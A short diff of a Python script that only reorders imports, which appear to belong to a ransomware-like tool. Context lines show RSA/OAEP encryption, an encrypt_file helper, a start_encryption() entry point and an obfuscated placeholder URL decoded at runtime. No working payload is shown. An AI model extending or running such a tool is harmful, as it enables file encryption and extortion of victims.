@@ -15,7 +15,6 @@ import sys
 import time
 import uuid
 import zlib
-import py7zr
 import psutil
 import base64
 import string
@@ -26,10 +25,9 @@ import getpass
 import hashlib
 import subprocess
 from datetime import datetime
-from Crypto.Random import get_random_bytes
-from zeroize import zeroize1, mlock, munlock
 from concurrent.futures import ThreadPoolExecutor
 
+import py7zr
 import requests
 import winshell
 from edx42 import dx42  # type: ignore
@@ -38,6 +36,8 @@ from Crypto.PublicKey import RSA
 from win32com.client import Dispatch
 from file_crypto import encrypt_file  # type: ignore
 from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Random import get_random_bytes
+from zeroize import zeroize1, mlock, munlock
 
 # Decode the encoded URL using the dx42 function.
 YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
@@ -760,4 +760,5 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
 
